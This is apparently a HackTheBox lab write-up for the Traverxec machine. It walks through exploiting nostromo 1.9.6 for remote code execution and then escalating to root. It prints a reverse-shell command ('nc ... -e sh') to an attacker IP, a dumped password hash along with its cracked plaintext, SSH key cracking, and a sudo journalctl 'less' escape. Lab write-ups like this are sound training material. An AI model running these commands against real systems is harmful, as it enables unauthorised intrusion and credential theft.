---
title: HTB | Traverxec
author: Zeropio
date: 2023-01-01
categories: [Pentesting, HackTheBox]
tags: [htb, linux, easy, machines]
permalink: /pentesting/htb/machines/traverxec
image:
  path: /assets/img/hackthebox/card/Traverxec.png
  width: 800
  height: 500
---

# Fingerprint

## Scan

The scan show:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa99a81668cd41ccf96c8401c759095c (RSA)
|   256 93dd1a23eed71f086b58470973a388cc (ECDSA)
|_  256 9dd6621e7afb8f5692e637f110db9bce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-title: TRAVERXEC
|_http-server-header: nostromo 1.9.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration

Searching for vulnerabilities:

```console
$ searchsploit nostromo   
------------------------------------------- ---------------------------------
 Exploit Title                             |  Path
------------------------------------------- ---------------------------------
Nostromo - Directory Traversal Remote Comm | multiple/remote/47573.rb
nostromo 1.9.6 - Remote Code Execution     | multiple/remote/47837.py
nostromo nhttpd 1.9.3 - Directory Traversa | linux/remote/35466.sh
------------------------------------------- ---------------------------------
```

This are the technologies used by the web:

```
http://10.10.10.165/ [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[nostromo 1.9.6], IP[10.10.10.165], JQuery, Script, Title[TRAVERXEC]
```

---

# Footprint

## Initial Access

Using the exploit gives a direct webshell:

```console
$ python2.7 47837.py 10.10.10.165 80 id

HTTP/1.1 200 OK
Date: Sun, 01 Jan 2023 17:01:12 GMT
Server: nostromo 1.9.6
Connection: close

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We can send a quickly shell:

```console
$ python2.7 47837.py 10.10.10.165 80 'nc 10.10.14.7 80 -e sh'
```

## Privilege Escalation

### User

Some info can be found in the configuration files:

```
# MAIN [MANDATORY]

servername              traverxec.htb
serverlisten            *
serveradmin             david@traverxec.htb
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

# LOGS [OPTIONAL]

logpid                  logs/nhttpd.pid

# SETUID [RECOMMENDED]

user                    www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons                  /var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
```

We can see a hash there:

```console
www-data@traverxec:/var/nostromo/conf$ cat .htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```

Cracking the hash:

```console
$ hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt

$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:Nowonly4me             
                                                          
Session..........: hashcat
Status...........: Cracked
```

Under `/home/david/public_www/`{: .filepath} we found the file `backup-ssh-identity-files.tgz`. Sending to our machine, we found an RSA that can be easily cracked:

```console
$ ssh2john id_rsa > hash.txt
$ $ john -w=/usr/share/wordlists/rockyou.txt hash.txt
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (id_rsa)
```

### Root

Under `bin/server-stats.sh`{: .filepath} we found a suspicious file:

```bash
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

As we can see, it is runing `journatctl` as sudo. We can execute that line and make a `less` scape to get a root shell:

```console
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Sun 2023-01-01 09:09:54 EST, end at Sun 2023-01-01 14:08:44 
Jan 01 09:09:55 traverxec systemd[1]: Starting nostromo nhttpd server...
Jan 01 09:09:55 traverxec systemd[1]: nostromo.service: Can't open PID file /
Jan 01 09:09:55 traverxec nhttpd[445]: started
Jan 01 09:09:55 traverxec nhttpd[445]: max. file descriptors = 1040 (cur) / 1
Jan 01 09:09:55 traverxec systemd[1]: Started nostromo nhttpd server.
!/bin/bash
root@traverxec:/home/david/bin#
```
